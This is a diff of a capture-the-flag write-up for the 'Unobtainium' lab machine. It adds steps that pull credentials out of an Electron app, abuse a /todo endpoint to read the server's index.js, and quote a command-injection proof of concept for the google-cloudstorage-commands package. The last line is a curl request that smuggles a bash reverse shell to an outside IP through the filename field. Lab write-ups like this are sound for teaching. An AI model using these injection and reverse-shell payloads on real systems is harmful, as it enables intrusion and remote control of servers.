@@ -237,8 +237,7 @@
 
 // Found a [tool](https://github.com/electron/asar)(By MarshallOfSound) to extract files from .asar files.
 
-
-
+// But it didnt really work to me.... 
 
 // We could also use another way to search strings that contain the word 'password'
 
@@ -247,9 +246,21 @@
 
         data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
 
+// Or we could also sniff the network packets with wireshark when opening the 'unobtainium' app
+
+![Image 4]()
+
+//  It's seems like Todo function has the capability to read files from the server. 
+
 // Now that we have credentials , we can try to connect with SSH to the machine , but it didnt worked
 
--=-=-=-Burp_SUite=-=-=--
+// So, i open BurpSuite and play with request in the repeater till i send a request with filename empty
+
+// And get ERROR response
+
+![Image 5]()
+
+// We could also get that response with 'curl'
 
     $ curl -X POST --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : ""}' -H "Content-Type: application/json" http://unobtainium.htb:31337/todo 
 ------
@@ -275,7 +286,120 @@
     </body>
     </html>
 
+// We can see there file called 'index.js' lets try to see his content.
+
+![Image 6]()
+
+// But its in bad format , i orginizeit a little bit
+
+    {"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");
+    const express = require('express');
+    const { exec } = require(\"child_process\");   
+    const bodyParser = require('body-parser');
+    const _ = require('lodash');
+    const app = express();
+    var fs = require('fs');
+    const users = [
+    {name: 'felamos', password: 'Winter2021'},\n  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
+    ];
+
+    let messages = [];
+    let lastId = 1; 
+    function findUser(auth) {
+    return users.find((u) => 
+    u.name === auth.name &&
+    u.password === auth.password);
+    }   
+
+    app.use(bodyParser.json());
+
+    app.get('/', (req, res) => {
+    res.send(messages);
+    }); 
+
+    app.put('/', (req, res) => { 
+    const user = findUser(req.body.auth || {}); 
+
+    if (!user) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+    }
+
+    const message = {
+    icon: '__',
+    };
+
+    _.merge(message, req.body.message, {
+    id: lastId++,
+    timestamp: Date.now(),
+    userName: user.name,
+    });
+
+    messages.push(message);
+    res.send({ok: true});
+    });
+
+    app.delete('/', (req, res) => {
+    const user = findUser(req.body.auth || {});
+
+    if (!user || !user.canDelete) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+    }
+
+    messages = messages.filter((m) => m.id !== req.body.messageId);
+    res.send({ok: true});
+    });
+    app.post('/upload', (req, res) => {
+    const user = findUser(req.body.auth || {});
+    if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+    }
+
+    filename = req.body.filename;
+    root.upload(\"./\",filename, true);
+    res.send({ok: true, Uploaded_File: filename});
+    });
+
+    app.post('/todo', (req, res) => {
+    const user = findUser(req.body.auth || {});
+    if (!user) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+    }
+
+    filename = req.body.filename;
+    testFolder = \"/usr/src/app\";
+    fs.readdirSync(testFolder).forEach(file => {
+    if (file.indexOf(filename) > -1) {
+    var buffer = fs.readFileSync(filename).toString();
+    res.send({ok: true, content: buffer});
+    }
+    });
+    });
+
+    app.listen(3000);
+    console.log('Listening on port 3000...');
+    "}
+
+// Most interesting thing in that file its the first line
+
+    {"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");
+
+// Searching for 'google-cloudstorage-commands' vulnerabilities, i found a vulnerablility for [Command Injection](https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431).
+
+PoC:
+
+    var root = require("google-cloudstorage-commands");
+    root.upload("./","& touch JHU", true);
+
+// In our case we need to manipulate the "filename"
+
+    root.upload("./",filename, true);
+
 // 
+
 
 $curl -H "Content-Type: application/json" -X POST http://unobtainium.htb:31337/upload --data '{"auth": {"name": "felamos", "password": "Winter2021"},"filename":"$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/1444 0>&1')"}
 
